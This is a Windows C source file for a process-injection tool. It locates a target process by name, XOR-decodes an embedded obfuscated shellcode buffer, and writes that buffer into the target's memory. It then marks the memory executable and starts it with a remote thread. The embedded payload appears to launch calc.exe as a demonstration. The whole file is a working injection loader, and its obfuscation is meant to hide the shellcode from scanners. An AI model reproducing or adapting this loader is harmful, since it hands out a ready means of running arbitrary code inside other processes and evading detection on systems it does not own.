#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <TlHelp32.h>

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define warn(msg)      printf("[-] " msg ", (Error code: %lu)" "\n", GetLastError())

// THIS VARIANT CAN FIND PROCESS BY NAME INSTEAD OF PID

int main (int argc, char *argv[]) {

    /* Define struct to store our "snapshot" of all of our PID's in memory --
	This is not included in the Windows header, but is included within the WinAPI. Need to include: TlHelp32.h. */
    PROCESSENTRY32 pe32;

    /* Set the size to represent the entire size of the struct */
	pe32.dwSize = sizeof(PROCESSENTRY32);

	/* Take a "snapshot" of all running processes in memory. */
	HANDLE pidSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    PVOID rBuffer = NULL;
    DWORD dwPID = 0, dwTID = 0;
    HANDLE hProcess = NULL, hThread = NULL;
    DWORD OldProtect;

    const char* process_name;

    if (argc < 2) {
        info("Usage: %s <process>", argv[0]);
        return EXIT_FAILURE;
    }

    process_name = argv[1];

    //dwPID = atoi(argv[1]);
    //info("Targeting PID: %d", dwPID);

    /* Walk process list to verify PID exists */
    BOOL found = FALSE;
    if (Process32First(pidSnapshot, &pe32)) {
        do {
            if (strcmp(pe32.szExeFile, process_name) == 0) {
                dwPID = pe32.th32ProcessID;
                info("Found process: %s (PID %lu)", pe32.szExeFile, dwPID);
                found = TRUE;
                break;
            }
        } while (Process32Next(pidSnapshot, &pe32));
    }

    CloseHandle(pidSnapshot);

    if (!found) {
        warn("Process not found");
        return EXIT_FAILURE;
    }
    
    // obf shellcode
    unsigned char buf[] = "\x9a\x2e\xe5\x82\x96\x8e\xa6\x66\x66\x66\x27\x37\x27\x36\x34\x37\x30\x2e\x57\xb4\x03\x2e\xed\x34\x06\x2e\xed\x34\x7e\x2e\xed\x34\x46\x2e\xed\x14\x36\x2e\x69\xd1\x2c\x2c\x2b\x57\xaf\x2e\x57\xa6\xca\x5a\x07\x1a\x64\x4a\x46\x27\xa7\xaf\x6b\x27\x67\xa7\x84\x8b\x34\x27\x37\x2e\xed\x34\x46\xed\x24\x5a\x2e\x67\xb6\xed\xe6\xee\x66\x66\x66\x2e\xe3\xa6\x12\x01\x2e\x67\xb6\x36\xed\x2e\x7e\x22\xed\x26\x46\x2f\x67\xb6\x85\x30\x2e\x99\xaf\x27\xed\x52\xee\x2e\x67\xb0\x2b\x57\xaf\x2e\x57\xa6\xca\x27\xa7\xaf\x6b\x27\x67\xa7\x5e\x86\x13\x97\x2a\x65\x2a\x42\x6e\x23\x5f\xb7\x13\xbe\x3e\x22\xed\x26\x42\x2f\x67\xb6\x00\x27\xed\x6a\x2e\x22\xed\x26\x7a\x2f\x67\xb6\x27\xed\x62\xee\x2e\x67\xb6\x27\x3e\x27\x3e\x38\x3f\x3c\x27\x3e\x27\x3f\x27\x3c\x2e\xe5\x8a\x46\x27\x34\x99\x86\x3e\x27\x3f\x3c\x2e\xed\x74\x8f\x31\x99\x99\x99\x3b\x2e\xdc\x67\x66\x66\x66\x66\x66\x66\x66\x2e\xeb\xeb\x67\x67\x66\x66\x27\xdc\x57\xed\x09\xe1\x99\xb3\xdd\x86\x7b\x4c\x6c\x27\xdc\xc0\xf3\xdb\xfb\x99\xb3\x2e\xe5\xa2\x4e\x5a\x60\x1a\x6c\xe6\x9d\x86\x13\x63\xdd\x21\x75\x14\x09\x0c\x66\x3f\x27\xef\xbc\x99\xb3\x05\x07\x0a\x05\x48\x03\x1e\x03\x66";
    size_t size_buf = sizeof(buf);
    unsigned char key = 0x66;
    
    // decryption
    for (int i = 0; i < size_buf; i++) {
        buf[i] = buf[i] ^ key;
    }

    // PROCESS INJECTION
    
    // 1. HANDLE
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (hProcess == NULL) {
        warn("Failed to get a handle for the process");
        return EXIT_FAILURE;
    }

    okay("Got a handle for %lu, [0x%p]", dwPID, hProcess);

    // 2. Allocate memory
    rBuffer = VirtualAllocEx(hProcess, NULL, size_buf, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (rBuffer == NULL) {
        warn("Failed to allocate memory");
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    okay("Memory allocated succesfully");

    // 3. Write to memory
    if(!WriteProcessMemory(hProcess, rBuffer, (LPCVOID)buf, size_buf, NULL)) {
        warn("Failed to write into buffer.");
        VirtualFreeEx(hProcess, rBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    okay("Shellcode injected");

    // 4. Change permissions
    if(!VirtualProtectEx(hProcess, rBuffer, size_buf, PAGE_EXECUTE_READ, &OldProtect)) {
        warn("Failed to change permissions");
        VirtualFreeEx(hProcess, rBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    okay("Permissions changed");

    // 5. Thread
    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, NULL, &dwTID);
    if (hThread == NULL) {
        warn("Failed to create a thread");
        return EXIT_FAILURE;
    }

    okay("Thread was created");

    WaitForSingleObject(hThread, INFINITE);
    info("Thread terminated");

    CloseHandle(hProcess);
    CloseHandle(hThread);

    return EXIT_SUCCESS;
}
